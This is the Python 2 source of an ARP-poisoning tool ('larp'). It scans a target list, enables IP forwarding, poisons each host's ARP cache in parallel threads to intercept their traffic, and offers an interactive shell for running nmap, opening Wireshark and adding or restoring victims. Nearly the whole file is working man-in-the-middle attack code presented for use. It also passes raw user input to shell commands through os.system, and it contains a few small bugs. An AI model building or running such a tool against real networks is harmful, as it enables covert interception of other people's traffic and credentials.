#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Script made by papi
#
# Arp poisonning tool used for retreiving data
# provide it a file named host.txt for the hosts he has to arp
# provide it an argument with the gateway ip
# it will arp the entire network to your' machine
# use threading to arp individual clients
# and setup a shell so that when you send an id it stops certain arps
import sys, os
import multiprocessing
import subprocess

import arp
import command

from scapy.all import *
from termcolor import colored

class larp():
    '''-*- larp class -*-
        larp is software made by papi for arp poisonning
    '''

    def __init__(self, cfg, silent, v=0):
        # setup all of the variables and the configurations
        print colored("[*] Starting up...", "green")    # startup_msg

        # this line had to be commented it threw up interface errors on my system
        #conf.iface = interface                          # interface var
        conf.verb = v                                   # configure verbose mode
        self.cfg = cfg
        self.interface = cfg['INTERFACE']               # save interface
        self.silent = silent
        self.g_ip = cfg['GATEWAY']                          # setup gateway_ip
        self.g_mac = arp.get_mac(self.g_ip)                 # get the gateway mac
        self.t_ip = []                                  # target_ip list
        self.t_mac = dict()                             # map ip -> mac addr
        self.thread_array = []                          # thread array
        self.id_map = dict()
        self.sniffer_proc_id = []                       # variable to control the sniffers
        self.kill = False
        arp.ip_forward()
        print colored("[^] Retreiving ip's", "blue")
        while 1:
            try:                                            # get all of the ip addr's
                with open(cfg['IP_PATH'], "r") as f:             # open up the target ip file
                    temp_ip = f.readlines()                 # get teh ip from the file
                    temp_ip = [ x.strip() for x in temp_ip ]
                    f.close()                               # remove EOL and close file
                print colored("[*] Retreiving mac addrs", "green")
                print "IP addr -> ",
                print temp_ip
                for ip in temp_ip:
                    temp = arp.get_mac(ip)
                    if temp == None:
                        print colored("[!] Skipping %s, mac addr is None" % ip, "red")
                    elif ip == self.g_ip:
                        print colored("[!] Skipping %s, it's the gateway" % ip, "red")
                    else:
                        self.t_ip.append(ip)
                        self.t_mac[ip] = temp               # retrieving mac addrs
                break

            except:
                print colored("[!!] IP file does not exist", "red")
                print colored("[#] Do you want to create it? (Make shure fping is installed)", "yellow")
                q = raw_input(colored("(Y/n) ", "magenta"))
                if q == 'Y':
                    rng = raw_input("Enter IP range (eq \"10.1.1.1 10.1.1.255\")\n>>")
                    os.system("fping -g -a %s > %s" % (rng, cfg['IP_PATH']))
                else:
                    break

        print colored("[*] Setup finished!", "green")

    def error(self, msg=""):
        ''' function to display errors '''
        print >> sys.stderr, colored(msg, 'red')
        sys.exit(-1)

    def get_ip_mac(self, buf):
        # id_map[int(buf)][0], id_map[int(buf)][1]
        ip = self.id_map[int(buf)][0]
        mac = self.id_map[int(buf)][1]
        id_no = int(buf)
        return id_no, ip, mac

    def process_cmd(self, t_id, buf):
        if "all" in buf or "a" == buf:
            for i in xrange(0, t_id):
                command.kill_instance(i, self.thread_array, self.g_ip, self.g_mac,\
                        self.id_map)
            self.kill = True

        elif "list" in buf or "l" == buf:
            for i in xrange(0, t_id):
                print colored("[^] %d => %s / %s" % (i, self.id_map[i][0], self.id_map[i][1]), "blue")
            print colored("[^] ip list -> %r" % self.t_ip, "blue")
            print colored("[^] ip map -> %r" % self.id_map, "blue")

        elif "nmap" in buf or "n" == buf.split(' ')[0]:
            if buf.split(' ')[0] == 'n':
                i, ip, mac = self.get_ip_mac(buf.split(' ')[1])
                print colored("[^] running nmap on %d => %s" % (i, ip), "blue")
                print colored("[*] Output:", "green")
                os.system("nmap %s" % ip)
            else:
                print colored("[*] Output:", "green")
                os.system("%s" % buf)

        elif "wireshark" in buf or "w" == buf.split(' ')[0]:
            command.exe_wireshark()

        elif "add" in buf:
            ipaddr = buf[buf.find(" ")+1:]
            command.add_ip(ipaddr, self.g_ip, self.t_ip, self.id_map, self.thread_array,\
                    self.g_mac, self.t_mac, self.cfg, self.silent)

        elif "start" in buf and self.silent:
            command.start_arp(self.t_ip, self.thread_array, self.g_ip, self.g_mac,\
                    self.t_mac, self.cfg, self.id_map)

        elif "kill" in buf:
            sys.exit(-1)

        elif "ifconfig" in buf:
            command.exe_ifconfig()

        elif buf.isdigit():
            if len(self.thread_array) > int(buf):
                i, ip, mac = get_ip_mac(buf)
                self.thread_array[i].terminate()
                arp.restore_target(self.g_ip, self.g_mac, ip, mac)
                print colored("[^] Restored: %s" % ip, "blue")

                del id_map[i]
            else:
                print colored("[!] are you trying to break this?!", "red")

        else:
            print colored(\
            "[!] Available commands: start - add - all - kill - wireshark - list - nmap", "red")

    def main(self):
        ''' main function '''
        t_id = 0    # thread id

        print colored("[*] Main Thread", "green")
        print colored("[^] Starting ARP poison", "blue")

        if not self.silent:
            command.start_arp(self.t_ip, self.thread_array, self.g_ip, self.g_mac,\
                    self.t_mac, self.cfg, self.id_map)

        print "id_map -> ",
        print self.id_map
        print colored("[*] Main menu:\n[*] Number of client's: %d" % t_id, "green")

        while not self.kill:
            buf = raw_input('#> ')               # display the prompt
            self.process_cmd(t_id, buf)               # process the command
            t_id = len(self.t_ip)

        for thread in self.thread_array:
            thread.join()

